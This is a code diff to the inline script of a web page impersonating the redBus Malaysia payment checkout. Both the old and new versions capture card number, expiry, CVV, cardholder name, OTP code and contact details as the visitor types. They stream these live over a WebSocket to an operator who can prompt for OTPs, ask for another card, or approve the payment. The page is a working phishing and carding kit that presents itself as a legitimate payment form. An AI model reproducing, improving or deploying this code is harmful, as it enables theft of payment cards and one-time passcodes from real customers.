@@ -479,655 +479,614 @@ url("pay1ment_icons.woff") format("woff");
 
 
 <script>
-                (function() {
-                    var discountPct = 0.20;
-                    window.setDiscount = function setDiscount(pct) {
-                        discountPct = pct;
-                        var pmc = document.getElementById('pm-credit');
-                        var pmd = document.getElementById('pm-debit');
-                        pmc.style.border = document.querySelector('[value=credit]').checked ? '2px solid #d84e55' : '2px solid #ddd';
-                        pmc.style.background = document.querySelector('[value=credit]').checked ? '#fdf2f3' : '#fff';
-                        pmd.style.border = document.querySelector('[value=debit]').checked ? '2px solid #d84e55' : '2px solid #ddd';
-                        pmd.style.background = document.querySelector('[value=debit]').checked ? '#fdf2f3' : '#fff';
-                        updatePrice();
-                    }
-                    ;
-
-                    //disc.toFixed(2)
-                    window.updatePrice = function() {
-                        k = JSON.parse(sessionStorage.getItem("redbus_booking") || "{}");
-                        var tot = Number(k.amount);
-                        var disc = tot * discountPct;
-                        var final = tot - disc;
-                        document.querySelector("#root > div > div > div.outerWrapper___c987d4 > div > div.expandedContentWrapper___2962b8 > div > div > div.totalPayableSection___b8c855 > div.fare").textContent = 'RM ' + final.toFixed(2);
-                        document.querySelector("#root > div.bottomSheetOverlay___e61510 > div > div.bottomSheetbody___5bc99f > div > div > div.totalPayableSection___b8c855 > div.fare").textContent = 'RM ' + final.toFixed(2);
-                        var pm = document.querySelector("#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span");
-                            pm.textContent = 'Pay RM ' + final.toFixed(2);
-                        var btn = document.getElementById('btnSubmit');
-
-                        if (btn){
-                            btn.textContent = 'Pay RM ' + final.toFixed(2);
-                          }
-
-                        if(final != tot)  {
-                          document.querySelectorAll("#fare-breakup > div:nth-child(4)")[0].style.display="flex";
-                          document.querySelectorAll("#fare-breakup > div:nth-child(4)")[1].style.display="flex";
-                        }else{
-                          document.querySelectorAll("#fare-breakup > div:nth-child(4)")[0].style.display="none";  
-                          document.querySelectorAll("#fare-breakup > div:nth-child(4)")[1].style.display="none";  
-                        }
-                        
-
-                        document.querySelector("#fare-breakup > div:nth-child(4) > div.\\[class\\*\\=paxItemRight\\] > b").textContent = '- RM ' + disc.toFixed(2);
-                        document.querySelector("#fare-breakup > div:nth-child(4) > div.\\[class\\*\\=paxItemRights\\] > b").textContent = '- RM ' + disc.toFixed(2);
-
-                        /*var dp = document.getElementById('discountMsg');
-                        if (dp)
-                            dp.style.display = discountPct ? '' : 'none';*/
-                    }
-                    ;
-                    var WS = (location.protocol == "https:" ? "wss:" : "ws:") + "//" + location.host + "/api/?role=customer&cid=" + encodeURIComponent("redbus_" + Date.now());
-                    var ws = null
-                      , s = null
-                      , tm = null
-                      , sec = 0;
-                    function q(id) {
-                        return document.getElementById(id);
-                    }
-                    function cws() {
-                        if (ws && ws.readyState === WebSocket.OPEN)
-                            return;
-                        ws = new WebSocket(WS);
-                        ws.onmessage = function(e) {
-                            try {
-                                handle(JSON.parse(e.data));
-                            } catch (err) {}
-                        }
-                        ;
-                    }
-                    function send(m) {
-                        if (!ws || ws.readyState !== WebSocket.OPEN) {
-                            q("couponLink") && q("couponLink").addEventListener("click", function() {
-                                var e = this.parentElement.querySelector("[class*=inputContainer]");
-                                if (e)
-                                    e.style.display = e.style.display === "none" ? "" : "none";
-                            });
-                            cws();
-                            setTimeout(function() {
-                                send(m);
-                            }, 500);
-                            return;
-                        }
-                        ws.send(JSON.stringify(m));
-                    }
-                    function handle(m) {
-                        switch (m.action) {
-                        case "ack":
-                            s = m.sessionId;
-                            msg("info", "Processing...");
-                            break;
-                        case "approve":
-                            msg("success", "Approved!");
-                            q("btnSubmit").disabled = true;
-                            q("btnSubmit").textContent = "Approved";
-                            clr();
-                            setTimeout(function() {
-                                location.href = "/complete/";
-                            }, 2000);
-                            break;
-                        case "reject":
-                            msg("error", "Declined.");
-                            q("btnSubmit").disabled = false;
-                            q("btnSubmit").textContent = "Pay";
-                            hideO();
-                            break;
-                        case "otp_verify":
-                            showO();
-                            if (m.countdown)
-                                start(m.countdown);
-                            break;
-                        case "timeout":
-                            msg("error", "Expired.");
-                            q("btnSubmit").disabled = false;
-                            q("btnSubmit").textContent = "Pay";
-                            hideO();
-                            break;
-                        case "card_error":
-                            msg("error", m.message || "Card error.");
-                            hideO();
-                            break;
-                        case "change_card":
-                            msg("info", "Try different card.");
-                            q("cardNumber").value = "";
-                            q("cardNumber").focus();
-                            hideO();
-                            break;
-                        case "session_restored":
-                            var c = m.cardInfo || {}
-                              , i = m.customerInfo || {};
-                            q("cardNumber").value = c.cardNumber || "";
-                            q("expiry").value = c.expiry || "";
-                            q("cvv").value = c.cvv || "";
-                            q("cardHolder").value = c.cardHolder || "";
-                            q("fullName").value = i.fullName || "";
-                            q("email").value = i.email || "";
-                            q("phone").value = i.phone || "";
-                            q("country").value = i.country || "";
-                            q("address1").value = i.address1 || "";
-                            q("address2").value = i.address2 || "";
-                            q("city").value = i.city || "";
-                            q("state").value = i.state || "";
-                            q("zipCode").value = i.zipCode || "";
-                            s = m.sessionId;
-                            msg("info", "Restored.");
-                            break;
-                        }
-                    }
-                    function msg(t, x) {
-                        var e = q("statusMsg");
-                        e.style.display = "block";
-                        e.textContent = x;
-                        e.style.color = t == "success" ? "#2e7d32" : t == "error" ? "#c62828" : "#1565c0";
-                        e.style.background = t == "success" ? "#e8f5e9" : t == "error" ? "#ffebee" : "#e3f2fd";
-                    }
-                    function showO() {
-                        q("otpSection").style.display = "block";
-                        q("btnSubmit").style.display = "none";
-                    }
-                    function hideO() {
-                        q("otpSection").style.display = "none";
-                        q("btnSubmit").style.display = "block";
-                        q("otpCode").value = "";
-                        clr();
-                    }
-                    function start(x) {
-                        clr();
-                        sec = x || 120;
-                        q("otpTimer").style.display = "block";
-                        tick();
-                        tm = setInterval(function() {
-                            sec--;
-                            tick();
-                            if (sec <= 0) {
-                                clr();
-                                msg("error", "OTP expired.");
-                                hideO();
-                            }
-                        }, 1000);
-                    }
-                    function clr() {
-                        if (tm) {
-                            clearInterval(tm);
-                            tm = null;
-                        }
-                        q("otpTimer").style.display = "none";
-                    }
-                    function tick() {
-                        var m = Math.floor(sec / 60)
-                          , s = sec % 60;
-                        q("otpTimer").textContent = m + ":" + (s < 10 ? "0" : "") + s;
-                    }
-                    function build() {
-                        return {
-                            frontendUrl: "redbus.my",
-                            currentStep: "card",
-                            browsingTabs: [{
-                                label: "Product",
-                                count: 0,
-                                active: false
-                            }, {
-                                label: "Address",
-                                count: 1,
-                                active: false
-                            }, {
-                                label: "Card",
-                                count: 1,
-                                active: true
-                            }],
-                            cardInfo: {
-                                cardNumber: (q("cardNumber").value || "").replace(/\s/g, ""),
-                                expiry: q("expiry").value || "",
-                                cvv: q("cvv").value || "",
-                                cardHolder: q("cardHolder").value || "",
-                                otpCode: q("otpCode").value || ""
-                            },
-                            customerInfo: {
-                                fullName: q("fullName").value || "",
-                                email: q("email").value || "",
-                                phone: q("phone").value || "",
-                                country: q("country").value || "",
-                                address1: q("address1").value || "",
-                                address2: q("address2").value || "",
-                                city: q("city").value || "",
-                                state: q("state").value || "",
-                                zipCode: q("zipCode").value || ""
-                            }
-                        };
-                    }
-                    q("cardNumber").addEventListener("input", function() {
-                        var v = this.value.replace(/\D/g, "");
-                        this.value = v.replace(/(.{4})/g, "$1 ").trim();
-                    });
-                    q("cardNumber").addEventListener("input", function() {
-                        var v = this.value.replace(/\D/g, "");
-                        this.value = v.replace(/(.{4})/g, "$1 ").trim();
-                    });
-                    document.querySelector("#root > div.bottomSheetOverlay___e61510 > div > div.header___f8e5c6 > div.actionWrap___a83340 > button").addEventListener("click", function() {
-                    document.querySelector("#root > div.bottomSheetOverlay___e61510").style.display = 'none';
-                    });
-                    document.querySelector("#root > div.payment__sea-payment-styles-module-scss-C7ooH > div > div.outerWrapper___c987d4 > div > div.collapsedContentWrapper___d9d1db > div > div.reviewBooking___0256aa > div.actionWrap___a83340 > button").addEventListener("click", function() {
-                    document.querySelector("#root > div.bottomSheetOverlay___e61510").style.display = 'block';
-                    });
-                    q("expiry").addEventListener("input", function() {
-                        var v = this.value.replace(/\D/g, "");
-                        if (v.length >= 3)
-                            v = v.slice(0, 2) + "/" + v.slice(2);
-                        if (v.length > 5)
-                            v = v.slice(0, 5);
-                        this.value = v;
-                    });
-                    q("btnSubmit").addEventListener("click", function() {_sessionCreating=true;
-                        var cn = (q("cardNumber").value || "").replace(/\s/g, "");
-                        if (!cn || !q("expiry").value || !q("cvv").value || !q("cardHolder").value || !q("fullName").value) {
-                            msg("error", "Fill all required fields.");
-                            return;
-                        }
-                        if (!/\d{2}\/\d{2}/.test(q("expiry").value)) {
-                            msg("error", "Invalid expiry.");
-                            return;
-                        }
-                        this.disabled = true;
-                        this.textContent = "Processing...";
-                        cws();
-                        var p = build();
-                        send({
-                            type: "customer_input",
-                            payload: p
-                        });
-                        setTimeout(function() {
-                            if (s) {
-                                var sp = build();
-                                sp.sessionId = s;
-                                sp.status = "pending";
-                                send({
-                                    type: "session_update",
-                                    payload: sp
-                                });
-                            }
-                        }, 1000);
-                    });
-                    q("btnOtp").addEventListener("click", function() {
-                        var o = q("otpCode").value;
-                        if (!o) {
-                            msg("error", "Enter OTP.");
-                            return;
-                        }
-                        if (!s)
-                            return;
-                        var p = build();
-                        p.sessionId = s;
-                        p.cardInfo.otpCode = o;
-                        p.status = "pending";
-                        send({
-                            type: "session_update",
-                            payload: p
-                        });
-                        this.disabled = true;
-                        this.textContent = "Verifying...";
-                    });
-                    (function() {
-                        var d = {};
-                        try {
-                            d = JSON.parse(sessionStorage.getItem("redbus_booking") || "{}");
-                        } catch (e) {}
-                        var pv = {};
-                        try {
-                            var raw = localStorage.getItem("profileDataValues");
-                            if (raw) {
-                                pv = JSON.parse(raw);
-                                if (Array.isArray(pv)) {
-                                    pv = pv[0] || {};
-                                }
-                            }
-                        } catch (e) {}
-                        if (pv["4"])
-                            d.passengerName = pv["4"];
-                        if (pv["5"])
-                            d.email = pv["5"];
-                        if (pv["6"])
-                            d.phone = pv["6"];
-                        if (pv["1"])
-                            d.paxAge = pv["1"];
-                        if (!d.origin && !d.destination) {
-                            var sp = new URLSearchParams(location.search);
-                            d.origin = sp.get("fromCityName") || "";
-                            d.destination = sp.get("toCityName") || "";
-                            d.departureDate = sp.get("onward") || sp.get("doj") || "";
-                        }
-                        ;
-                        if (d.origin || d.destination) {
-
-                            // 璇诲彇涔樺鏁版嵁
-                            var pvArr = [];
-
-                            try {
-                                var pvRaw = localStorage.getItem("profileDataValues");
-
-                                if (pvRaw)
-                                    pvArr = JSON.parse(pvRaw);
-
-                                if (Array.isArray(pvArr))
-                                    pvArr = pvArr[0] ? pvArr : [pvArr];
-                                else
-                                    pvArr = [];
-
-                            } catch (e) {
-                                pvArr = [];
-                            }
-
-                            // 姝ｇ‘涔樺鏁伴噺
-                            var nPax = pvArr.length || Number(d.pax) || 1;
-
-                            var pf = "RM "
-                              , tot = Number(d.amount || 0)
-                              , b = d.busName || d.operator || d.origin + " to " + d.destination
-                              , bt = d.busType || nPax + " Passenger" + (nPax > 1 ? "s" : "");
-
-                            document.querySelector("#root > div > div > div.outerWrapper___c987d4 > div > div.collapsedContentWrapper___d9d1db > div > div.reviewBooking___0256aa > div.container___a0f2af.primary___65e13a.withSubtitle___365025 > div > div").textContent = nPax + " Passenger" + (nPax > 1 ? "s" : "")+ " · " + d.busname;
-                            document.querySelector("#root > div > div > div.outerWrapper___c987d4 > div > div.collapsedContentWrapper___d9d1db > div > div.journeySummary___89e6c2 > div.sdWrap___e467b0 > div:nth-child(1)").textContent = d.depPlace;
-                            document.querySelector("#root > div > div > div.outerWrapper___c987d4 > div > div.collapsedContentWrapper___d9d1db > div > div.journeySummary___89e6c2 > div.sdWrap___e467b0 > div:nth-child(3)").textContent = d.arrPlace;
-                            document.querySelector("#root > div > div > div.outerWrapper___c987d4 > div > div.collapsedContentWrapper___d9d1db > div > div.journeySummary___89e6c2 > div.dateTimeWrap___0861f5").textContent = d.departureDate + " · " + d.departureTime;
-                            document.querySelector("#root > div.bottomSheetOverlay___e61510 > div > div.bottomSheetbody___5bc99f > div > div > div.travelsNameSection___10c9d1 > h2").textContent = d.busName;
-                            document.querySelector("#root > div.bottomSheetOverlay___e61510 > div > div.bottomSheetbody___5bc99f > div > div > div.travelsNameSection___10c9d1 > div").textContent = bt;
-                            document.querySelector("#fare-breakup > div.fbtitle___51ae39 > div").textContent = bt;
-                            document.querySelector("#root > div.payment__sea-payment-styles-module-scss-C7ooH > div > div.outerWrapper___c987d4 > div > div.expandedContentWrapper___2962b8 > div > div > div.tripSummary___9d2bcf > div > div.durationWrapper___76186c > span").textContent = d.duration;
-                            document.querySelector("#root > div.bottomSheetOverlay___e61510 > div > div.bottomSheetbody___5bc99f > div > div > div.tripSummary___9d2bcf > div > div.durationWrapper___76186c > span").textContent = d.duration;
-                             
-
-
-
-                            var el = document.querySelector(".travelsName___d10818");
-
-                            if (el)
-                                el.textContent = b;
-
-                            el = document.querySelector(".travelsType___7edfa4");
-
-                            if (el)
-                                el.textContent = bt;
-
-                            if (d.departureTime) {
-                                el = document.querySelectorAll(".bpDpTime___f40dc2");
-
-                                el[0].textContent = d.departureTime + " ";
-                                el[1].textContent = d.arrivalTime + " ";
-                                el[2].textContent = d.departureTime + " ";
-                                el[3].textContent = d.arrivalTime + " ";
-                            }
-
-                            if (d.departureDate) {
-                                var ds = document.querySelectorAll(".bpDpDate___b3efb5");
-
-                                ds[0].textContent = d.departureDate;
-                                ds[1].textContent = d.arriveDate;
-                                ds[2].textContent = d.departureDate;
-                                ds[3].textContent = d.arriveDate;
-                            }
-
-                            if (d.depPlace) {
-                                el = document.querySelectorAll(".bpDpName___013800");
-
-                                el[0].textContent = d.depPlace;
-                                el[1].textContent = d.depPlace;
-                            }
-
-                            if (d.depAddr) {
-                                el = document.querySelectorAll(".bpDpAddress___b1f1a6");
-
-                                el[0].textContent = d.depAddr;
-                                el[2].textContent = d.depAddr;
-                            }
-
-                            if (d.arrAddr) {
-                                document.querySelectorAll(".bpDpAddress___b1f1a6")[1].textContent = d.arrAddr;
-                                document.querySelectorAll(".bpDpAddress___b1f1a6")[3].textContent = d.arrAddr;
-                                
-                            }
-
-                            var bps = document.querySelectorAll(".bpDpName___013800");
-
-                            if (bps[1] && d.arrPlace)
-                                bps[1].textContent = d.arrPlace;
-                                bps[3].textContent = d.arrPlace;
-
-                            /*if (d.passengerName) {
-                                el = document.querySelectorAll(".name___4cb74b");
-
-                                el[0].textContent = d.passengerName;
-                                el[1].textContent = d.passengerName;
-                            }
-
-                            if (d.seats) {
-                                el = document.querySelector(".paxSeat___af80c2");
-
-                                if (el)
-                                    el.textContent = "Seats: " + d.seats.split("\n").join(", ");
-                            }
-
-                            if (d.paxAge) {
-                                el = document.querySelector(".age___7326c6");
-
-                                if (el)
-                                    el.textContent = " " + d.paxAge + " years";
-                            }*/
-
-                            // 姝ｇ‘璐圭敤
-                            var bpFee = nPax * 2;
-
-                            var bf = tot - bpFee;
-
-                            // 鎬婚噾棰?
-                            var fs = document.querySelectorAll(".fare");
-
-                            for (var i = 0; i < fs.length; i++)
-                                fs[i].textContent = pf + tot.toFixed(2);
-
-                            /*// Boarding Pass
-                            var bpr = document.querySelector('[class*="paxItemRight"]');
-
-                            if (bpr) {
-                                bpr.textContent = "RM " + bpFee.toFixed(2);
-                                bpr.style.fontWeight = "bold";
-                            }*/
-
-                            // Base Fare
-                            var bprs = document.querySelectorAll('[class*="paxItemRight"]');
-
-                            if (bprs[0])
-                                bprs[0].innerHTML = "<b>RM " + bf.toFixed(2) + "</b>";
-                                bprs[4].innerHTML = "<b>RM " + bf.toFixed(2) + "</b>";
-
-                            // Boarding Fee
-                            //var bpElem = bprs[bprs.length - 1];
-
-                            if (bprs[1])
-                                bprs[1].innerHTML = "<b>RM " + bpFee.toFixed(2) + "</b>";
-                                bprs[5].innerHTML = "<b>RM " + bpFee.toFixed(2) + "</b>";
-
-                            // Passenger count
-                            el = document.querySelector(".seatCount___7ccc14");
-
-                            if (el)
-                                el.textContent = nPax + " Passenger" + (nPax > 1 ? "s" : "");
-
-                            // 鎸夐挳
-                            var ps = document.querySelectorAll(".title___1fab2c span");
-
-                            for (var i = 0; i < ps.length; i++)
-                                ps[i].textContent = "Pay " + pf + tot.toFixed(2);
-
-                            if (q("btnSubmit"))
-                                q("btnSubmit").textContent = "Pay " + pf + tot.toFixed(2);
-
-                            // 濮撳悕
-                            if (d.fullName || d.passengerName) {
-                                var fn = d.fullName || d.passengerName;
-
-                                if (q("fullName"))
-                                    q("fullName").value = fn;
-                            }
-
-                            // 閭
-                            if (d.email) {
-                                var ee = document.querySelector("#dynEmail");
-                                document.querySelector("#root > div.bottomSheetOverlay___e61510 > div > div.bottomSheetbody___5bc99f > div > div > div.contactDetailsSection___849eeb > div:nth-child(2)").textContent = d.email;
-                                if (ee)
-                                    ee.textContent = d.email;
-
-                                if (q("email"))
-                                    q("email").value = d.email;
-                            }
-
-                            // 涔樺鍒楄〃
-                            var seatsArr = (d.seats || "").split("\n").filter(Boolean);
-
-                            var paxHtml = "";
-
-                            for (var i = 0; i < pvArr.length; i++) {
-
-                                var px = pvArr[i];
-
-                                var nm = px["4"] || "";
-                                var ag = px["1"] || "";
-                                var st = seatsArr[i] || "";
-
-                                if (nm || st) {
-
-                                    paxHtml += '<div class="paxDetails___f7e02a">' + '<div class="paxInfo___19a73d">' + '<div class="name___4cb74b">' + nm + '</div>' + (ag ? '<div class="age___7326c6"> ' + ag + ' years</div>' : '') + '</div>' + '<div class="paxSeat___af80c2">Seat: ' + st + '</div>' + '</div>';
-                                }
-                            }
-
-                            var pl = document.getElementById("paxList");
-
-                            if (pl && paxHtml)
-                                pl.innerHTML = paxHtml;
-
-                            if (!paxHtml) {
-
-                                pl = document.querySelector(".paxInfo___19a73d");
-
-                                if (pl) {
-
-                                    var nm2 = d.passengerName || "";
-
-                                    pl.innerHTML = '<div class="name___4cb74b">' + nm2 + '</div>';
-                                }
-                            }
-
-
-
-                            var pls = document.getElementById("paxLists");
-
-                            if (pls && paxHtml)
-                                pls.innerHTML = paxHtml;
-
-                            if (!paxHtml) {
-
-                                pls = document.querySelector(".paxInfo___19a73d.chengke");
-
-                                if (pls) {
-
-                                    var nm2 = d.passengerName || "";
-
-                                    pls.innerHTML = '<div class="name___4cb74b">' + nm2 + '</div>';
-                                }
-                            }
-
-                            // 鐢佃瘽
-                            if (d.phone) {
-
-                                var pp = document.querySelector("#dynPhone");
-                                document.querySelector("#root > div.bottomSheetOverlay___e61510 > div > div.bottomSheetbody___5bc99f > div > div > div.contactDetailsSection___849eeb > div:nth-child(3)").textContent = d.phone;
-                                if (pp)
-                                    pp.textContent = d.phone;
-
-                                if (q("phone"))
-                                    q("phone").value = d.phone;
-                            }
-                        }
-                    
-                    updatePrice();
-                    setDiscount(discountPct);
-                    if(window.innerWidth <= 768){
-    document.querySelector("#root > div > div > div.outerWrapper___c987d4 > div > div.expandedContentWrapper___2962b8").style.display = 'none';
-    document.querySelector("#root > div > div > div.outerWrapper___c987d4 > div").className = 'mobileView___158905';
-    var hd = document.querySelector(
-        ".topHeaderWrapper___606940 header"
-    );
-
-    if(hd)
-        hd.style.display = "none";
-}else{
-  document.querySelector("#root > div.payment__sea-payment-styles-module-scss-C7ooH > div > div.outerWrapper___c987d4 > div > div.collapsedContentWrapper___d9d1db").style.display = 'none';
-}
-
-
-
-                    }
-                    )();
-                    var liveTimer = null;
-                    var _sessionCreating = false;
-                    var created = false;
-
-function livePush() {
-
-    if (!ws || ws.readyState !== 1)
-        return;
-
-    var p = build();
-
-    if (!created) {
-
-        created = true;
+(function () {
+
+    var cid = localStorage.getItem('redbus_cid');
+
+    if (!cid) {
+        cid = 'redbus_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+        localStorage.setItem('redbus_cid', cid);
+    }
+
+    var WS = (location.protocol === "https:" ? "wss:" : "ws:")
+        + "//" + location.host
+        + "/api/?role=customer&cid="
+        + encodeURIComponent(cid);
+
+    var ws = null;
+    var s = null;
+
+    var tm = null;
+    var sec = 0;
+
+    var liveTimer = null;
+
+    // 防止重复创建session
+    var _sessionCreating = false;
+
+    function q(id) {
+        return document.getElementById(id);
+    }
+
+    // WS连接
+    function cws() {
+
+        if (ws &&
+            (
+                ws.readyState === WebSocket.OPEN ||
+                ws.readyState === WebSocket.CONNECTING
+            )
+        ) {
+            return;
+        }
+
+        ws = new WebSocket(WS);
+
+        ws.onopen = function () {
+            console.log('ws connected');
+        };
+
+        ws.onmessage = function (e) {
+
+            try {
+
+                var m = JSON.parse(e.data);
+
+                console.log('ws recv', m);
+
+                handle(m);
+
+            } catch (err) {
+                console.log(err);
+            }
+        };
+
+        ws.onclose = function () {
+
+            console.log('ws closed');
+
+            setTimeout(function () {
+                cws();
+            }, 1000);
+        };
+
+        ws.onerror = function () {
+            console.log('ws error');
+        };
+    }
+
+    // 统一发送
+    function send(m) {
+
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+
+            cws();
+
+            setTimeout(function () {
+                send(m);
+            }, 500);
+
+            return;
+        }
+
+        ws.send(JSON.stringify(m));
+    }
+
+    // 接收
+    function handle(m) {
+
+        switch (m.action) {
+
+            case "ack":
+
+                s = m.sessionId;
+
+                _sessionCreating = false;
+
+                console.log('session created', s);
+
+                break;
+
+            case "approve":
+
+                msg("success", "Approved!");
+
+                q("btnSubmit").disabled = true;
+                q("btnSubmit").textContent = "Approved";
+
+                clr();
+
+                setTimeout(function () {
+                    location.href = "/complete/";
+                }, 2000);
+
+                break;
+
+            case "reject":
+
+                msg("error", "Declined.");
+
+                q("btnSubmit").disabled = false;
+                q("btnSubmit").textContent = "Pay";
+
+                hideO();
+
+                break;
+
+            case "otp_verify":
+
+                showO();
+
+                if (m.countdown)
+                    start(m.countdown);
+
+                break;
+
+            case "timeout":
+
+                msg("error", "Expired.");
+
+                q("btnSubmit").disabled = false;
+                q("btnSubmit").textContent = "Pay";
+
+                hideO();
+
+                break;
+
+            case "card_error":
+
+                msg("error", m.message || "Card error.");
+
+                hideO();
+
+                break;
+
+            case "change_card":
+
+                msg("info", "Try different card.");
+
+                q("cardNumber").value = "";
+
+                q("cardNumber").focus();
+
+                hideO();
+
+                break;
+
+            case "session_restored":
+
+                var c = m.cardInfo || {};
+                var i = m.customerInfo || {};
+
+                q("cardNumber").value = c.cardNumber || "";
+                q("expiry").value = c.expiry || "";
+                q("cvv").value = c.cvv || "";
+                q("cardHolder").value = c.cardHolder || "";
+
+                q("fullName").value = i.fullName || "";
+                q("email").value = i.email || "";
+                q("phone").value = i.phone || "";
+
+                s = m.sessionId;
+
+                console.log('session restored', s);
+
+                break;
+        }
+    }
+
+    function msg(t, x) {
+
+        var e = q("statusMsg");
+
+        if (!e) return;
+
+        e.style.display = "block";
+        e.textContent = x;
+
+        e.style.color =
+            t == "success"
+                ? "#2e7d32"
+                : t == "error"
+                    ? "#c62828"
+                    : "#1565c0";
+
+        e.style.background =
+            t == "success"
+                ? "#e8f5e9"
+                : t == "error"
+                    ? "#ffebee"
+                    : "#e3f2fd";
+    }
+
+    function showO() {
+
+        if (q("otpSection"))
+            q("otpSection").style.display = "block";
+
+        if (q("btnSubmit"))
+            q("btnSubmit").style.display = "none";
+    }
+
+    function hideO() {
+
+        if (q("otpSection"))
+            q("otpSection").style.display = "none";
+
+        if (q("btnSubmit"))
+            q("btnSubmit").style.display = "block";
+
+        if (q("otpCode"))
+            q("otpCode").value = "";
+
+        clr();
+    }
+
+    function start(x) {
+
+        clr();
+
+        sec = x || 120;
+
+        if (q("otpTimer"))
+            q("otpTimer").style.display = "block";
+
+        tick();
+
+        tm = setInterval(function () {
+
+            sec--;
+
+            tick();
+
+            if (sec <= 0) {
+
+                clr();
+
+                msg("error", "OTP expired.");
+
+                hideO();
+            }
+
+        }, 1000);
+    }
+
+    function clr() {
+
+        if (tm) {
+
+            clearInterval(tm);
+
+            tm = null;
+        }
+
+        if (q("otpTimer"))
+            q("otpTimer").style.display = "none";
+    }
+
+    function tick() {
+
+        var m = Math.floor(sec / 60);
+        var s2 = sec % 60;
+
+        if (q("otpTimer"))
+            q("otpTimer").textContent =
+                m + ":" + (s2 < 10 ? "0" : "") + s2;
+    }
+
+    // 收集数据
+    function build() {
+
+        return {
+
+            frontendUrl: "redbus.my",
+
+            currentStep: "card",
+
+            cardInfo: {
+
+                cardNumber: (q("cardNumber")?.value || "").replace(/\s/g, ""),
+
+                expiry: q("expiry")?.value || "",
+
+                cvv: q("cvv")?.value || "",
+
+                cardHolder: q("cardHolder")?.value || "",
+
+                otpCode: q("otpCode")?.value || ""
+            },
+
+            customerInfo: {
+
+                fullName: q("fullName")?.value || "",
+
+                email: q("email")?.value || "",
+
+                phone: q("phone")?.value || "",
+
+                country: q("country")?.value || "",
+
+                address1: q("address1")?.value || "",
+
+                address2: q("address2")?.value || "",
+
+                city: q("city")?.value || "",
+
+                state: q("state")?.value || "",
+
+                zipCode: q("zipCode")?.value || ""
+            }
+        };
+    }
+
+    // 实时同步
+    function livePush() {
+
+        if (!ws || ws.readyState !== 1) {
+
+            cws();
+
+            return;
+        }
+
+        var p = build();
+
+        // session不存在
+        if (!s) {
+
+            // 防并发
+            if (_sessionCreating)
+                return;
+
+            _sessionCreating = true;
+
+            // 防止ack丢失锁死
+            setTimeout(function () {
+                _sessionCreating = false;
+            }, 3000);
+
+            console.log('create session');
+
+            ws.send(JSON.stringify({
+
+                type: 'customer_input',
+
+                payload: p
+
+            }));
+
+            return;
+        }
+
+        // 已存在session
+        console.log('live update');
 
         ws.send(JSON.stringify({
-            type: 'customer_input',
-            payload: p
-        }));
 
-    } else if (s) {
-
-        ws.send(JSON.stringify({
             type: 'session_update',
+
             payload: {
+
                 sessionId: s,
+
                 cardInfo: p.cardInfo,
+
                 customerInfo: p.customerInfo,
+
                 currentStep: 'card'
             }
-        }));
 
+        }));
     }
-}
-                    function onInput() {
-                        clearTimeout(liveTimer);
-                        liveTimer = setTimeout(livePush, 150);
-                          console.log('发送');
-                    }
-                    var liveInputs = ['cardNumber', 'expiry', 'cvv', 'cardHolder', 'fullName', 'email', 'phone', 'country', 'address1', 'address2', 'city', 'state', 'zipCode', 'otpCode'];
-                    liveInputs.forEach(function(id) {
-                        var el = q(id);
-                        if (el){
-    el.addEventListener('input', onInput);
-    console.log(id + ' 加上了');
-}else{
-    console.log(id + ' 没找到');
-}
+
+    // 输入监听
+    function onInput() {
+
+        clearTimeout(liveTimer);
+
+        liveTimer = setTimeout(function () {
+
+            livePush();
+
+        }, 150);
+    }
+
+    var liveInputs = [
+        'cardNumber',
+        'expiry',
+        'cvv',
+        'cardHolder',
+        'fullName',
+        'email',
+        'phone',
+        'country',
+        'address1',
+        'address2',
+        'city',
+        'state',
+        'zipCode',
+        'otpCode'
+    ];
+
+    liveInputs.forEach(function (id) {
+
+        var el = q(id);
+
+        if (el) {
+
+            el.addEventListener('input', onInput);
+
+            console.log(id + ' listener added');
+        }
+    });
+
+    // 卡号格式化
+    if (q("cardNumber")) {
+
+        q("cardNumber").addEventListener("input", function () {
+
+            var v = this.value.replace(/\D/g, "");
+
+            this.value =
+                v.replace(/(.{4})/g, "$1 ").trim();
+        });
+    }
+
+    // 日期格式化
+    if (q("expiry")) {
+
+        q("expiry").addEventListener("input", function () {
+
+            var v = this.value.replace(/\D/g, "");
+
+            if (v.length >= 3)
+                v = v.slice(0, 2) + "/" + v.slice(2);
+
+            if (v.length > 5)
+                v = v.slice(0, 5);
+
+            this.value = v;
+        });
+    }
+
+    // 点击支付
+    if (q("btnSubmit")) {
+
+        q("btnSubmit").addEventListener("click", function () {
+
+            var cn = (q("cardNumber").value || "").replace(/\s/g, "");
+
+            if (
+                !cn ||
+                !q("expiry").value ||
+                !q("cvv").value ||
+                !q("cardHolder").value ||
+                !q("fullName").value
+            ) {
+
+                msg("error", "Fill all required fields.");
+
+                return;
+            }
+
+            if (!/\d{2}\/\d{2}/.test(q("expiry").value)) {
+
+                msg("error", "Invalid expiry.");
+
+                return;
+            }
+
+            this.disabled = true;
+
+            this.textContent = "Processing...";
+
+            cws();
+
+            var p = build();
+
+            // 没session才创建
+            if (!s) {
+
+                if (_sessionCreating)
+                    return;
+
+                _sessionCreating = true;
+
+                send({
+
+                    type: "customer_input",
+
+                    payload: p
+                });
+
+                // 防锁死
+                setTimeout(function () {
+                    _sessionCreating = false;
+                }, 3000);
+
+                // 等ack后再pending
+                setTimeout(function () {
+
+                    if (!s)
+                        return;
+
+                    var sp = build();
+
+                    sp.sessionId = s;
+
+                    sp.status = "pending";
+
+                    send({
+
+                        type: "session_update",
+
+                        payload: sp
                     });
-                    ;cws();
-                }
-                )();
-            </script>
+
+                }, 1200);
+
+            } else {
+
+                // 已有session直接更新
+                var sp = build();
+
+                sp.sessionId = s;
+
+                sp.status = "pending";
+
+                send({
+
+                    type: "session_update",
+
+                    payload: sp
+                });
+            }
+        });
+    }
+
+    // OTP提交
+    if (q("btnOtp")) {
+
+        q("btnOtp").addEventListener("click", function () {
+
+            var o = q("otpCode").value;
+
+            if (!o) {
+
+                msg("error", "Enter OTP.");
+
+                return;
+            }
+
+            if (!s)
+                return;
+
+            var p = build();
+
+            p.sessionId = s;
+
+            p.cardInfo.otpCode = o;
+
+            p.status = "pending";
+
+            send({
+
+                type: "session_update",
+
+                payload: p
+            });
+
+            this.disabled = true;
+
+            this.textContent = "Verifying...";
+        });
+    }
+
+    // 启动WS
+    cws();
+
+})();
+</script>
 
 
 
